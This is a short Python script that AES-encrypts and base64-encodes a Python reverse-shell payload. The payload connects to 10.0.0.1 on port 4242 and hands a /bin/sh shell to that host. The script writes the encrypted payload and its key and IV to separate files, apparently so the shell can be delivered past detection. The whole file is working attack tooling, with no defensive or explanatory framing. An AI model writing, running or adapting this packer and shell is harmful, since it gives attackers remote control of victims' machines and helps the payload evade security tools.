import base64
import random
from Crypto.Cipher import AES

payload = b"""import socket,os,pty
s=socket.socket()
s.connect(("10.0.0.1",4242))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/sh")"""

# Generate 16 random bytes
key = bytes([random.randint(0, 255) for _ in range(16)])
# Generate a random IV
iv = bytes([random.randint(0, 255) for _ in range(16)])

# Pad the payload to be a multiple of 16 bytes
padding_length = 16 - (len(payload) % 16)
payload += bytes([padding_length] * padding_length)

# Encrypt the payload
cipher = AES.new(key, AES.MODE_CBC, iv)
ciphertext = cipher.encrypt(payload)

# Write key and iv to a file
with open("key_iv.txt", "wb") as f:
    f.write(key + iv)
    
# Encode the ciphertext in base64
b64_ciphertext = base64.b64encode(ciphertext)
# Write the base64 encoded ciphertext to a file
with open("payload.txt", "wb") as f:
    f.write(b64_ciphertext)